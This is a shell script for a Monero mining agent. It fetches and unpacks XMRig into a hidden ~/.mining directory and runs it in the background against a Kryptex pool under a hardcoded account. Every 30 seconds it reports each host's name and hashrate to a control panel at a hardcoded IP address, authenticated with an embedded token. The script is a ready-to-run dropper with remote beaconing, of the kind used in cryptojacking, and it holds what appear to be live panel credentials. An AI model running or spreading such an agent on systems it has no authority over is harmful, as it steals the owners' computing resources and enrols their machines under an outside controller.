#!/bin/sh
set -u

############################################
# MINING CONTROL CENTER — XMRIG API AGENT
############################################

### ===== PANEL =====
PANEL="http://178.47.141.130:3333"
TOKEN="mamont22187"
INTERVAL=30

### ===== MINING =====
KRIPTEX_USERNAME="krxX3PVQVR"
HOST="$(hostname)"

XMR_POOL="xmr.kryptex.network:7029"

BASE="$HOME/.mining/bin"
RUN="$HOME/.mining/run"
LOG="$HOME/.mining/log"

XMR_USER="${KRIPTEX_USERNAME}.${HOST}"

mkdir -p "$BASE/xmr" "$RUN" "$LOG" >/dev/null 2>&1 || true

############################################
# -------- PANEL API -----------------------
############################################

send_event() {
  curl -s "$PANEL/api/event" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"level\": \"$1\",
      \"message\": \"$2\"
    }" >/dev/null 2>&1 || true
}

############################################
# -------- XMRIG API -----------------------
############################################

get_xmrig_summary() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary
}

get_hashrate() {
  get_xmrig_summary \
    | grep -oE '"total":\[[^]]+' \
    | head -1 \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | head -1 || echo 0
}

get_threads() {
  get_xmrig_summary \
    | grep -oE '"count":[0-9]+' \
    | grep -oE '[0-9]+' || echo 0
}

############################################
# -------- TELEMETRY -----------------------
############################################

send_telemetry() {
  HASHRATE="$(get_hashrate)"
  THREADS="$(get_threads)"

  CPU_STATUS="stopped"
  [ -f "$RUN/mining-cpu.pid" ] && CPU_STATUS="running"

  curl -s "$PANEL/api/telemetry" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"cpu_mining\": \"$CPU_STATUS\",
      \"gpu_mining\": \"stopped\",
      \"gpu_detected\": false,
      \"hashrate\": $HASHRATE
    }" >/dev/null 2>&1 || true
}

############################################
# -------- MINER ---------------------------
############################################

start_cpu() {
  pkill -f xmrig 2>/dev/null || true

  nohup "$BASE/xmr/xmrig" \
    -o "$XMR_POOL" \
    -u "$XMR_USER" \
    -p x \
    --http-enabled \
    --http-host 127.0.0.1 \
    --http-port 16000 \
    >> "$LOG/xmr.log" 2>&1 &

  echo $! > "$RUN/mining-cpu.pid"
}

############################################
# -------- INSTALL -------------------------
############################################

install_xmrig() {
  [ -f "$BASE/xmr/xmrig" ] && return

  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || return
  tar -xzf /tmp/xmr.tgz -C "$BASE/xmr" --strip-components=1
}

############################################
# -------- AGENT ---------------------------
############################################

agent() {
  send_event "INFO" "XMRig API agent started"
  start_cpu

  ZERO=0

  while true; do
    HASHRATE="$(get_hashrate)"
    send_telemetry

    if [ "$HASHRATE" = "0" ]; then
      ZERO=$((ZERO+1))
      [ "$ZERO" -ge 3 ] && send_event "CRITICAL" "XMR hashrate = 0"
    else
      ZERO=0
    fi

    sleep "$INTERVAL"
  done
}

############################################
# -------- MAIN ----------------------------
############################################

install_xmrig
agent
